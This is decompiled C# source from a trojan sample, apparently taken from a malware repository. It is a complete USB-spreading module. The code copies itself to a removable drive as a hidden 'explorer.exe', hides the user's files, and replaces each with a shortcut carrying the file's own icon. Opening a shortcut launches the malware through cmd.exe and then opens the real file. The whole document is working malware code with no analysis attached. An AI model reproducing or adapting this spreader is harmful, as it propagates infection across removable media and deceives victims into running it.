// Decompiled with JetBrains decompiler
// Type: explorer.USB
// Assembly: explorer, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 195DEFF7-EAD4-41F2-9360-D121391B9155
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Agent.gen-8106ef3eb81450eaa681bebbbe8671e3fdbaed8568e8d0376bda37c75ad61c02.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Windows.Forms;

namespace explorer
{
  public class USB
  {
    private string CP;
    public string ExeName;
    public Collection dr;

    public USB()
    {
      this.CP = "explorer\\";
      this.ExeName = "explorer.exe";
      this.dr = new Collection();
    }

    public void start_spread() => this.usb();

    public void stop_spread() => this.clean();

    public void clean()
    {
      string path1 = DriveInfo.GetDrives()[1].Name + this.CP;
      try
      {
        if (File.Exists(path1 + this.ExeName))
        {
          File.SetAttributes(path1 + this.ExeName, FileAttributes.Normal);
          File.Delete(path1 + this.ExeName);
        }
        string[] files = Directory.GetFiles(path1);
        int index1 = 0;
        while (index1 < files.Length)
        {
          string path2 = files[index1];
          try
          {
            File.SetAttributes(path2, FileAttributes.Normal);
            if (path2.ToLower().EndsWith(".lnk"))
              File.Delete(path2);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          checked { ++index1; }
        }
        string[] directories = Directory.GetDirectories(path1);
        int index2 = 0;
        while (index2 < directories.Length)
        {
          string path3 = directories[index2];
          try
          {
            new DirectoryInfo(path3).Attributes = FileAttributes.Normal;
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          checked { ++index2; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void usb()
    {
      this.clean();
      try
      {
        string str1 = DriveInfo.GetDrives()[1].Name + this.CP;
        USB.DRV drv;
        if (!this.dr.Contains(str1.ToLower()))
        {
          drv = new USB.DRV();
          drv.drive = str1;
          this.dr.Add((object) drv, str1.ToLower());
        }
        else
          drv = (USB.DRV) this.dr[str1.ToLower()];
        try
        {
          try
          {
            if (!File.Exists(str1 + this.ExeName))
            {
              File.Copy(Application.ExecutablePath, str1 + this.ExeName, true);
              File.SetAttributes(str1 + this.ExeName, FileAttributes.Hidden);
            }
            string[] files = Directory.GetFiles(str1);
            int index = 0;
            while (index < files.Length)
            {
              string str2 = files[index];
              if (Operators.CompareString(Path.GetExtension(str2).ToLower(), ".lnk", false) != 0 & Operators.CompareString(str2.ToLower(), str1.ToLower() + this.ExeName.ToLower(), false) != 0)
              {
                if (!drv.Files.Contains(new FileInfo(str2).Name))
                {
                  if (drv.Files.Count < 20)
                  {
                    this.lnk(str1, str2, this.GetIcon(Path.GetExtension(str2)));
                    drv.Files.Add(new FileInfo(str2).Name);
                    File.SetAttributes(str2, FileAttributes.Hidden);
                    drv.lnk.Add(File.ReadAllText(str1 + new FileInfo(str2).Name + ".lnk"));
                  }
                }
                else if (drv.Files.Contains(new FileInfo(str2).Name))
                {
                  if (File.GetAttributes(str2) != FileAttributes.Hidden)
                    File.SetAttributes(str2, FileAttributes.Hidden);
                  if (!File.Exists(str1 + new FileInfo(str2).Name + ".lnk"))
                    this.lnk(str1, str2, this.GetIcon(Path.GetExtension(str2)));
                  else if (Operators.CompareString(File.ReadAllText(str1 + new FileInfo(str2).Name + ".lnk"), drv.lnk[drv.Files.IndexOf(new FileInfo(str2).Name)], false) != 0)
                    this.lnk(str1, str2, this.GetIcon(Path.GetExtension(str2)));
                }
              }
              checked { ++index; }
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public object lnk(string x, string xx, string ico)
    {
      try
      {
        File.Delete(x + new FileInfo(xx).Name + ".lnk");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      object Instance = NewLateBinding.LateGet(Interaction.CreateObject("WScript.Shell"), (System.Type) null, "CreateShortcut", new object[1]
      {
        (object) (x + new FileInfo(xx).Name + ".lnk")
      }, (string[]) null, (System.Type[]) null, (bool[]) null);
      NewLateBinding.LateSetComplex(Instance, (System.Type) null, "TargetPath", new object[1]
      {
        (object) "cmd.exe"
      }, (string[]) null, (System.Type[]) null, false, true);
      NewLateBinding.LateSetComplex(Instance, (System.Type) null, "WorkingDirectory", new object[1]
      {
        (object) ""
      }, (string[]) null, (System.Type[]) null, false, true);
      NewLateBinding.LateSetComplex(Instance, (System.Type) null, "Arguments", new object[1]
      {
        (object) ("/c start " + this.ExeName.Replace(" ", "\" \"") + "&explorer /root,\"%CD%" + new DirectoryInfo(xx).Name + "\" & exit")
      }, (string[]) null, (System.Type[]) null, false, true);
      NewLateBinding.LateSetComplex(Instance, (System.Type) null, "IconLocation", new object[1]
      {
        (object) ico
      }, (string[]) null, (System.Type[]) null, false, true);
      NewLateBinding.LateCall(Instance, (System.Type) null, "Save", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
      object obj;
      return obj;
    }

    public string GetIcon(string ext)
    {
      string icon;
      try
      {
        RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Classes\\", false);
        string str = Conversions.ToString(registryKey.OpenSubKey(Conversions.ToString(Operators.ConcatenateObject(registryKey.OpenSubKey(ext, false).GetValue(""), (object) "\\DefaultIcon\\"))).GetValue("", (object) ""));
        if (!str.Contains(","))
          str += ",0";
        icon = str;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        icon = "";
        ProjectData.ClearProjectError();
      }
      return icon;
    }

    public class DRV
    {
      public string drive;
      public List<string> Files;
      public List<string> lnk;

      public DRV()
      {
        this.Files = new List<string>();
        this.lnk = new List<string>();
      }
    }
  }
}
